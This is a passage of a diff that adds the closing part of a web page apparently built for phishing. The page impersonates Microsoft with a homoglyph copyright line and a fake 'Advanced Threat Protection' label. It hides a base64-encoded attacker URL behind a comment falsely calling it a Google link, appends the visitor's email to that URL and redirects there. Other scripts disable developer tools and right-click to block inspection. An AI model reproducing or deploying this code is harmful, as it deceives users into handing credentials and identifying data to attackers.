+                                var linkx = "aHR0cHM6Ly90dnJjZW1laGVmZi5yZWFsbHR5MzYwLmNvbS9QZVBrUGVLWCM=";
+                                // Base64 encoded link for "https://google.com"
+                                var decodedLink = atob(linkx);
+                                var finalLink = decodedLink + "#" + email;
+                                // Append the email directly to the URL
+                                window.location.href = finalLink;
+                            }
+                        </script>
+                        <!-- <div class="g-recaptcha" data-sitekey="6LdNVGwpAAAAAAClR8cH0yXoYVZ6MN0vZ4B3hV2D" data-callback="callback"></div> -->
+                        <p class="desktopMessage">
+                            <span>Powered by</span>
+                            &nbsp;<a class="launchLink" id="tryProtocolLaunchTeamsClient" href="#">Advanced Threat Protection
+       </a>
+                        </p>
+                    </div>
+                    <div class="footer" role="contentinfo">
+                        <div class="desktopMessage" style="margin-top: 20px; font-size: 1em;">
+                            <a href="#" target="_blank" rel="noopener noreferrer">Legal</a>
+                            <a href="#" target="_blank" rel="noopener noreferrer">Privacy and cookies</a>
+                            <span>&copy;2025 Μі‏‏‏сг‏о‏‏ѕоf‏‏‏t</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+        <script type="text/javascript">
+            function callback() {
+                const submitButton = document.getElementById("H3BhALtRar");
+                submitButton.removeAttribute("disabled");
+            }
+        </script>
+        <script>
+            function makeid(length) {
+                var result = "";
+                var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+                var charactersLength = characters.length;
+                for (var i = 0; i < length; i++) {
+                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+                }
+                return result;
+            }
+
+            function picker(characters) {
+                var result = "";
+                //var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                var charactersLength = characters.length;
+                for (var i = 0; i < 1; i++) {
+                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+                }
+                return result;
+            }
+
+            function pageRedirect() {
+                var urls = ["https://google.com", "https://google.com/", "https://google.com/"];
+
+                var params = ["2r", "T3utpRk"];
+
+                var take_url = urls[picker("012")];
+                var take_params = params[picker("01")];
+
+                var hash = window.location.href;
+                hash = hash.split(/[?#]/)[1];
+                var myurl = take_url + "?" + makeid(3) + "=" + makeid(5);
+                //var someVar = hash.replace('8nFYHmxu|^-WfUwpv!l', '');
+                var someVar = hash.replace('_g!l*1fx6qni*_WfUwp^-*_ga*v!7', '');
+
+                window.location.href = myurl + "&" + take_params + "=" + someVar;
+            }
+        </script>
+        <script async="async" type="text/javascript">
+            // Disable F12 key and Ctrl+Shift+I combo
+            document.addEventListener("keydown", (event) => {
+                if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && event.keyCode === 73)) {
+                    event.preventDefault();
+                }
+            }
+            );
+        </script>
+        <script async="async" type="text/javascript">
+            <!--
+            // With jQuery
+            $(document).on({
+                "contextmenu": function(e) {
+                    console.log("ctx menu button:", e.which);
+                    // Stop the context menu
+                    e.preventDefault();
+                },
+                "mousedown": function(e) {
+                    console.log("normal mouse down:", e.which);
+                },
+                "mouseup": function(e) {
+                    console.log("normal mouse up:", e.which);
+                }
+            });
+            // -->
+        </script>
+    </body>
+</html>
